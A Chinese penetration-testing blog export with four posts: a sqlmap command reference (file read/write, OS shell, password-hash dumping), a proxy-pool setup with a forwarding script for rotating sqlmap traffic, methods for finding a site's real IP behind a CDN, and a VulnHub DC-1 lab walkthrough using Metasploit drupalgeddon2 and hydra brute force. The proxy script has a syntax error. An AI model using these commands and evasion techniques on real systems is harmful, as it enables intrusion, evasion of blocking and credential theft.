<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot; --file-read&#x3D;&#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;php.ini</span><br></pre></td></tr></table></figure>
<p>写文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot; --file-write C:\1.txt --file-dest &#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;vulnerabilities&#x2F;exec&#x2F;1.txt</span><br></pre></td></tr></table></figure>
<p>表示将本地<code>C:\\1.txt</code> 写入到服务器端<code>/opt/lampp/htdocs/vulnerabilities/exec/1.txt</code></p>
<h3 id="辅助手工注入">辅助手工注入</h3>
<p>两种方式，一种是每执行一次都会使用手工的语句注入一遍，效率比较低，第二种类似于平常命令行执行sql语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -r &quot;路径&quot; --sql-query &quot;sql语句&quot;</span><br><span class="line">sqlmap.py -r &quot;路径&quot; --sql-shell</span><br></pre></td></tr></table></figure>
<h2 id="SqlMap检测参数">SqlMap检测参数</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--current-user      检索当前用户</span><br><span class="line">--current-db        检索当前数据库</span><br><span class="line">-is-dba 当前用户权限（是否为root权限）</span><br><span class="line">-dbs 所有数据库</span><br><span class="line">--users             列出用户列表</span><br><span class="line">--passwords         列出用户密码的hash值</span><br><span class="line">--os-shell          提示为交互式操作系统shell</span><br><span class="line">--os-pwn            提示为OOB外壳，Meterpreter或VNC</span><br><span class="line">--batch             永远不要要求用户输入，使用默认行为</span><br><span class="line">--sql-shell         提示输入交互式sqlmap shell</span><br><span class="line">请求:</span><br><span class="line">    这些选项可用于指定如何连接到目标URL</span><br><span class="line">    --data&#x3D;DATA         数据字符串通过POST发送</span><br><span class="line">    --cookie&#x3D;COOKIE     HTTP Cookie的值</span><br><span class="line">    --random-agent      随机选择 HTTP User-Agent 头的值</span><br><span class="line">    --proxy&#x3D;PROXY       使用代理去连接目标URL</span><br><span class="line">    --tor               使用匿名网络</span><br><span class="line">    --check-tor         检查Tor是否正确使用</span><br><span class="line"></span><br><span class="line">File system access（访问文件系统）：</span><br><span class="line">这些选项可以被用来访问后端数据库管理系统的底层文件系统。</span><br><span class="line"></span><br><span class="line">    –file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件</span><br><span class="line">    –file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line">    –file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</span><br><span class="line"></span><br><span class="line">Optimization（优化）：</span><br><span class="line">这些选项可用于优化SqlMap的性能。</span><br><span class="line">    -o 开启所有优化开关</span><br><span class="line">    –predict-output 预测常见的查询输出</span><br><span class="line">    –keep-alive 使用持久的HTTP（S）连接</span><br><span class="line">    –null-connection 从没有实际的HTTP响应体中检索页面长度</span><br><span class="line">    –threads&#x3D;THREADS 最大的HTTP（S）请求并发量（默认为1）</span><br><span class="line"></span><br><span class="line">Injection（注入）：</span><br><span class="line">这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</span><br><span class="line">    -p TESTPARAMETER 可测试的参数（S）</span><br><span class="line">    –dbms&#x3D;DBMS 强制后端的DBMS为此值</span><br><span class="line">    –os&#x3D;OS 强制后端的DBMS操作系统为这个值</span><br><span class="line">    –prefix&#x3D;PREFIX 注入payload字符串前缀</span><br><span class="line">    –suffix&#x3D;SUFFIX 注入payload字符串后缀</span><br><span class="line">    –tamper&#x3D;TAMPER 使用给定的脚本（S）篡改注入数据</span><br><span class="line"></span><br><span class="line">Detection（检测）：</span><br><span class="line">这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</span><br><span class="line">    –level&#x3D;LEVEL 执行测试的等级（1-5，默认为1）</span><br><span class="line">    –risk&#x3D;RISK 执行测试的风险（0-3，默认为1）</span><br><span class="line">    –string&#x3D;STRING 查询时有效时在页面匹配字符串</span><br><span class="line">    –regexp&#x3D;REGEXP 查询时有效时在页面匹配正则表达式</span><br><span class="line">    –text-only 仅基于在文本内容比较网页</span><br><span class="line"></span><br><span class="line">Techniques（技巧）：</span><br><span class="line">这些选项可用于调整具体的SQL注入测试。</span><br><span class="line">    –technique&#x3D;TECH SQL注入技术测试（默认BEUST）</span><br><span class="line">    –time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</span><br><span class="line">    –union-cols&#x3D;UCOLS 定列范围用于测试UNION查询注入</span><br><span class="line">    –union-char&#x3D;UCHAR 用于暴力猜解列数的字符</span><br><span class="line"></span><br><span class="line">Fingerprint（指纹）：</span><br><span class="line">    -f, –fingerprint 执行检查广泛的DBMS版本指纹</span><br><span class="line"></span><br><span class="line">Brute force（蛮力）：</span><br><span class="line">这些选项可以被用来运行蛮力检查。</span><br><span class="line">    –common-tables 检查存在共同表</span><br><span class="line">    –common-columns 检查存在共同列</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>SqlMap代理池</title>
    <url>/2020/06/22/%E4%BB%A3%E7%90%86%E6%B1%A0/</url>
    <content><![CDATA[<h2 id="获取代理池">获取代理池</h2>
<p>获取代理池使用了GIthub上的项目：<a href="https://github.com/jhao104/proxy_pool" target="_blank" rel="noopener">https://github.com/jhao104/proxy_pool</a> ，并利用REDIS存储获取到的代理地址</p>
<h3 id="启动项目">启动项目</h3>
<p>在<code>cli</code>目录下通过<code>ProxyPool.py</code>启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 首先启动调度程序</span><br><span class="line">&gt;&gt;&gt;python proxyPool.py schedule</span><br><span class="line"></span><br><span class="line"># 然后启动webApi服务</span><br><span class="line">&gt;&gt;&gt;python proxyPool.py webserver</span><br></pre></td></tr></table></figure>
<h3 id="Api">Api</h3>
<p>启动过几分钟后就能看到抓取到的代理IP，可以直接到数据库中查看，也可以通过api访问http://127.0.0.1:5010 查看。</p>
<table>
<thead>
<tr>
<th>api</th>
<th>method</th>
<th>Description</th>
<th>arg</th>
</tr>
</thead>
<tbody>
<tr>
<td>/</td>
<td>GET</td>
<td>api介绍</td>
<td>None</td>
</tr>
<tr>
<td>/get</td>
<td>GET</td>
<td>随机获取一个代理</td>
<td>None</td>
</tr>
<tr>
<td>/get_all</td>
<td>GET</td>
<td>获取所有代理</td>
<td>None</td>
</tr>
<tr>
<td>/get_status</td>
<td>GET</td>
<td>查看代理数量</td>
<td>None</td>
</tr>
<tr>
<td>/delete</td>
<td>GET</td>
<td>删除代理</td>
<td>proxy=host:ip</td>
</tr>
</tbody>
</table>
<h3 id="保存代理">保存代理</h3>
<p>自己编写了个小脚本将<code>ProxyPool.py</code>获取到的代理保存在<code>ips.txt</code>中<br>
<strong>get_proxy.py</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def get_proxy():</span><br><span class="line">    return requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;get_all&#x2F;&quot;).json()</span><br><span class="line"></span><br><span class="line">def delete_proxy(proxy):</span><br><span class="line">    requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;delete&#x2F;?proxy&#x3D;&#123;&#125;&quot;.format(proxy))</span><br><span class="line"></span><br><span class="line">res &#x3D; requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5010&#x2F;get_status&quot;).json()</span><br><span class="line">count &#x3D; res.get(&quot;useful_proxy&quot;)</span><br><span class="line">print(&quot;目前代理池中共计：%s个代理.&quot; % count)</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&quot;ips.txt&quot;, &quot;w&quot;)</span><br><span class="line">for i in range(count):</span><br><span class="line">    b &#x3D; get_proxy()[i][&quot;proxy&quot;]</span><br><span class="line">f.write(b + &quot;\n&quot;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<h2 id="本地代理转发">本地代理转发</h2>
<p>借用前人的成果，实现的效果是启用本地<code>127.0.0.1:9999</code>服务，将<code>ips.txt</code>内的代理转发给本地客户端<br>
<strong><a href="http://ips.py" target="_blank" rel="noopener">ips.py</a></strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> error</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">localtime = time.asctime(time.localtime(time.time()))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyServerTest</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, proxyip)</span>:</span></span><br><span class="line">        <span class="comment"># 本地socket服务</span></span><br><span class="line">        self.ser = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.proxyip = proxyip</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 本地服务IP和端口</span></span><br><span class="line">            self.ser.bind((<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>))</span><br><span class="line">            <span class="comment"># 最大连接数</span></span><br><span class="line">            self.ser.listen(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span> error <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="string">"[-]The local service : "</span> + str(e))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"[-]The local service : "</span> + str(e)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 接收客户端数据</span></span><br><span class="line">                client, addr = self.ser.accept()</span><br><span class="line">                print(<span class="string">'[*]accept %s connect'</span> % (addr,))</span><br><span class="line">                data = client.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                print(<span class="string">'[*'</span> + localtime + <span class="string">']: Accept data...'</span>)</span><br><span class="line">            <span class="keyword">except</span> error <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">"[-]Local receiving client : "</span> + str(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"[-]Local receiving client : "</span> + str(e)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="comment"># 目标代理服务器，将客户端接收数据转发给代理服务器</span></span><br><span class="line">                mbsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                iplen = len(self.proxyip)</span><br><span class="line">                proxyip = self.proxyip[random.randint(<span class="number">0</span>, iplen - <span class="number">1</span>)]</span><br><span class="line">                print(<span class="string">"[!]Now proxy ip:"</span> + str(proxyip))</span><br><span class="line">                prip = proxyip[<span class="number">0</span>]</span><br><span class="line">                prpo = proxyip[<span class="number">1</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    mbsocket.settimeout(<span class="number">3</span>)</span><br><span class="line">                    mbsocket.connect((prip, prpo))</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    print(<span class="string">"[-]RE_Connect..."</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">#                   except :</span></span><br><span class="line">            <span class="comment">#                       print("[-]Connect failed,change proxy ip now...")</span></span><br><span class="line">            <span class="comment">#                      pass</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                mbsocket.send(data)</span><br><span class="line">            <span class="keyword">except</span> error <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">"[-]Sent to the proxy server : "</span> + str(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"[-]Sent to the proxy server : "</span> + str(e)</span><br><span class="line">                               </span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="comment"># 从代理服务器接收数据，然后转发回客户端</span></span><br><span class="line">                    data_1 = mbsocket.recv(<span class="number">1024</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> data_1:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    print(<span class="string">'[*'</span> + localtime + <span class="string">']: Send data...'</span>)</span><br><span class="line">                    client.send(data_1)</span><br><span class="line">                <span class="keyword">except</span> socket.timeout <span class="keyword">as</span> e:</span><br><span class="line">                    print(proxyip)</span><br><span class="line">                    print(<span class="string">"[-]Back to the client : "</span> + str(e))</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 关闭连接</span></span><br><span class="line"></span><br><span class="line">            client.close()</span><br><span class="line">            mbsocket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Loadips</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[*]Loading proxy ips.."</span>)</span><br><span class="line">    ip_list = []</span><br><span class="line">    ip = [<span class="string">'ip'</span>, <span class="string">'port'</span>]</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"ips.txt"</span>) <span class="keyword">as</span> ips:</span><br><span class="line">        lines = ips.readlines()</span><br><span class="line">                               </span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        ip[<span class="number">0</span>], ip[<span class="number">1</span>] = line.strip().split(<span class="string">":"</span>)</span><br><span class="line">        ip[<span class="number">1</span>] = eval(ip[<span class="number">1</span>])</span><br><span class="line">        nip = tuple(ip)</span><br><span class="line">        ip_list.append(nip)</span><br><span class="line">    <span class="keyword">return</span> ip_list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'''*Atuhor : V@1n3R.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*Blog :http://www.Lz1y.cn</span></span><br><span class="line"><span class="string">*date: 2017.7.17</span></span><br><span class="line"><span class="string">*http://www.Lz1y.cn/wordpress/?p=643</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                         __     __    _       _____ ____    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                         \ \   / /_ _/ |_ __ |___ /|  _ \   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                          \ \ / / _` | | '_ \  |_ \| |_) |  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                           \ V / (_| | | | | |___) |  _ &lt; _ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            \_/ \__,_|_|_| |_|____/|_| \_(_) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line"></span><br><span class="line">    ip_list = Loadips()</span><br><span class="line">    <span class="comment">#   ip_list = [('118.89.148.92',8088)]</span></span><br><span class="line">    <span class="comment">#   ip_list = tuple(ip_list)</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pst = ProxyServerTest(ip_list)</span><br><span class="line">        <span class="comment"># 多线程</span></span><br><span class="line">        t = threading.Thread(target=pst.run, name=<span class="string">'LoopThread'</span>)</span><br><span class="line">        print(<span class="string">'[*]Waiting for connection...'</span>)</span><br><span class="line">        <span class="comment"># 关闭多线程</span></span><br><span class="line">        t.start()</span><br><span class="line">        t.join()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"[-]main : "</span> + str(e))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"[-]main : "</span> + str(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="SqlMap使用代理池">SqlMap使用代理池</h2>
<blockquote>
<p>sqlmap加上代理 “–proxy=http://127.0.0.1:9999” 即可使用</p>
<p>使用之前建议先检测一下代理的有效性：<a href="http://h.jiguangdaili.com/check/" target="_blank" rel="noopener">http://h.jiguangdaili.com/check/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过CDN寻找真实IP</title>
    <url>/2020/06/23/%E7%BB%95%E8%BF%87CDN/</url>
    <content><![CDATA[<blockquote>
<p>目前很多站点出于用户体验和安全的角度，使用CDN加速，将域名解析到CDN，这时候就需要绕过CDN来查找真实IP。</p>
</blockquote>
<h2 id="一、DNS历史解析记录">一、DNS历史解析记录</h2>
<p>查询域名的历史解析记录，找网站使用CDN前的解析记录，从而获取真实ip，相关查询的网站有：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">iphistory：https://viewdns.info/iphistory/</span><br><span class="line">DNS查询：（https://dnsdb.io/zh-cn/）</span><br><span class="line">微步在线：（https://x.threatbook.cn/）</span><br><span class="line">域名查询：（https://site.ip138.com/）</span><br><span class="line">DNS历史查询：（https://securitytrails.com/）</span><br><span class="line">Netcraft：https://sitereport.netcraft.com/?url=github.com</span><br></pre></td></tr></table></figure>
<h2 id="二、子域名">二、子域名</h2>
<p>很多时候，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。<br>
常用的子域名查找方法和工具：</p>
<ol>
<li>搜索引擎查询：如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。</li>
<li>在线查询网站：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;tool.chinaz.com&#x2F;subdomain&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;i.links.cn&#x2F;subdomain&#x2F;    </span><br><span class="line">http:&#x2F;&#x2F;subdomain.chaxun.la&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;searchdns.netcraft.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.virustotal.com&#x2F;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>子域名爆破工具</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Layer子域名挖掘机</span><br><span class="line">wydomain：https:&#x2F;&#x2F;github.com&#x2F;ring04h&#x2F;wydomain    </span><br><span class="line">subDomainsBrute:https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;</span><br><span class="line">Sublist3r:https:&#x2F;&#x2F;github.com&#x2F;aboul3la&#x2F;Sublist3r</span><br></pre></td></tr></table></figure>
<h2 id="三、网站邮件头信息">三、网站邮件头信息</h2>
<p>比如：邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200623112316.png" alt=""></p>
<h2 id="四、网络空间安全引擎搜索">四、网络空间安全引擎搜索</h2>
<p>通过关键字或网站域名，就可以找出被收录的IP，很多时候获取到的就是网站的真实IP。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">钟馗之眼：https:&#x2F;&#x2F;www.zoomeye.org</span><br><span class="line">Shodan：https:&#x2F;&#x2F;www.shodan.io</span><br><span class="line">Fofa：https:&#x2F;&#x2F;fofa.so</span><br></pre></td></tr></table></figure>
<h2 id="五、利用SSL证书">五、利用SSL证书</h2>
<p>证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。<br>
SSL证书搜索引擎：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;censys.io&#x2F;ipv4?q&#x3D;github.com</span><br></pre></td></tr></table></figure>
<h2 id="六、国外主机解析域名">六、国外主机解析域名</h2>
<p>大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的DNS查询，很可能获取到真实IP。<br>
国外多PING测试工具：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;asm.ca.com&#x2F;zh_cn&#x2F;ping.php</span><br><span class="line">http:&#x2F;&#x2F;host-tracker.com&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.webpagetest.org&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;dnscheck.pingdom.com&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="七、全网扫描">七、全网扫描</h2>
<p>通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP。</p>
<ol>
<li>ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zmap&#x2F;zmap</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscan</span><br></pre></td></tr></table></figure>
<h2 id="八、配置不当导致绕过">八、配置不当导致绕过</h2>
<p>在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。</p>
<ul>
<li>案例1：为了方便用户访问，<a href="http://xn--www-ot9d021dl8ca199e.test.com" target="_blank" rel="noopener">我们常常将www.test.com</a> 和 <a href="http://test.com" target="_blank" rel="noopener">test.com</a> 解析到同一个站点，<a href="http://xn--CDNwww-5e8i318auw2h9jblx9h.test.com" target="_blank" rel="noopener">而CDN只配置了www.test.com</a>，<a href="http://xn--test-pr9lp7quqa868a.com" target="_blank" rel="noopener">通过访问test.com</a>，就可以绕过 CDN 了。</li>
<li>案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。</li>
</ul>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>CDN</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub渗透之DC-1</title>
    <url>/2020/05/25/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-1/</url>
    <content><![CDATA[<h2 id="0×00-说明">0×00 说明</h2>
<blockquote>
<p>kali与目标处于同一网段下<br>
攻击机：Kali(VMware ) IP:192.168.1.31</p>
</blockquote>
<p>特别说明：每个靶机作者都对靶机做了详细的描述以及攻击目标，比如DC1就需要找到5个flag，最终目标是在root的主目录中找到并读取该标志！</p>
<p>通过每个flag所获得知识点</p>
<p>1、msf的熟练使用以及搜索可利用漏洞（Drupal）；</p>
<p>2、留意目标网站的配置文件（慢慢查看别错过重要信息）；</p>
<p>3、数据库管理员提权（更新管理员密码或者添加一个新用户）；</p>
<p>4、suid提权的命令（nmap、vim、find、bash、more、less、nano、cp）。</p>
<h2 id="0×01-信息收集">0×01 信息收集</h2>
<h3 id="探测目标IP">探测目标IP</h3>
<p>namp -sP 192.168.1.0/24<br>
arp-scan -l	//扫描当前网段下的IP<br>
Cadmus Computer Systems 表示Virtualbox虚拟机<br>
分析得出目标IP为192.168.1.30</p>
<blockquote>
<p>靶机：DC-1(Virtualbox) IP:192.168.1.30</p>
</blockquote>
<h3 id="扫描端口">扫描端口</h3>
<p>nmap -sV -p- 192.168.1.30	//扫描全端口<br>
-sV 用来扫描目标主机和端口上运行的软件的版本<br>
-p- 扫描0-65535全部端口</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524190438.png" alt=""></p>
<p>80端口开放，访问一下</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524191012.png" alt=""></p>
<p>Wappalyzer进行网站指纹识别，查看到是Drupal 7</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524191337.png" alt=""></p>
<p>查看一下robots.txt文件已经目录扫描(省略)。。发现没有可利用的地方</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524192628.png" alt=""></p>
<h2 id="0×02metasploit">0×02metasploit</h2>
<p>直接上metasploit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@sf:~# msfconsole</span><br><span class="line">msf &gt; search Drupal</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524201135.png" alt=""></p>
<p>选择4，drupalgeddon2的exp，设置下rhost，直接exploit，成功</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524212454.png" alt=""></p>
<p>接下来使用msf自带的shell</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524213300.png" alt=""></p>
<h3 id="发现flag1">发现flag1</h3>
<p>查看当前路径下的文件，发现<code>flag1.txt</code>文件，查看一下，发现提示CMS配置文件有猫腻</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524213406.png" alt=""></p>
<h3 id="发现flag2">发现flag2</h3>
<p>网上搜索得知，Drupal 7的默认配置文件为<code>sites/default/settings.php</code>，查看发现flag2，还有数据库连接信息</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524213927.png" alt=""></p>
<h2 id="0×003-弯路">0×003 弯路</h2>
<p>尝试连接数据库，结果连接失败，应该是权限不足</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524214247.png" alt=""></p>
<h3 id="爆破flag4用户密码">爆破flag4用户密码</h3>
<p>于是去查看<code>/etc/passwd</code>文件，发现flag4用户</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524214358.png" alt=""></p>
<p>使用hydra尝试爆破flag4用户的密码，<code>hydra -l flag4 -P /usr/share/john/password.lst ssh://192.168.1.30</code></p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524214646.png" alt=""></p>
<p>成功爆破flag4的密码，为 orange ，接下来ssh登录flag4用户，查看当前路径下有<code>flag4.txt</code>，得到新的提示——root目录里有个flag</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215013.png" alt=""></p>
<h2 id="0×04-连接数据库">0×04 连接数据库</h2>
<p>然后我们连接数据库，这次成功</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215205.png" alt=""></p>
<p>顺藤摸瓜，仔细查找数据库</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215355.png" alt=""></p>
<p>查看user表，发现admin用户</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215445.png" alt=""></p>
<p>查看role表</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215512.png" alt=""></p>
<p>查看role_permission表</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215644.png" alt=""></p>
<p>查看node表</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215712.png" alt=""></p>
<h3 id="发现flag3">发现flag3</h3>
<p>发现flag3，得知uid为1的用户是不受Drupal权限管制的，具有最高权限，uid 1用户也就是admin，</p>
<h2 id="0×05-两个思路">0×05 两个思路</h2>
<h3 id="一、重置管理员密码">一、重置管理员密码</h3>
<p>使用Drupal对数据库的加密方法，加密脚本位置在网站根目录下的script下(msf shell)，使用脚本生成加密密文，然后登陆数据库修改admin的密码</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524222511.png" alt=""></p>
<p>修改密码为123456</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524222543.png" alt=""></p>
<p>成功登陆</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524222616.png" alt=""></p>
<h3 id="二、添加一个管理员权限的用户">二、添加一个管理员权限的用户</h3>
<p>先查看一下靶机的版本，7.24</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524232222.png" alt=""></p>
<p>msf搜索Druapl 7.24对应可利用的脚本，发现一个符合</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524232538.png" alt=""></p>
<p>运行脚本，进行利用</p>
<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524232830.png" alt=""></p>
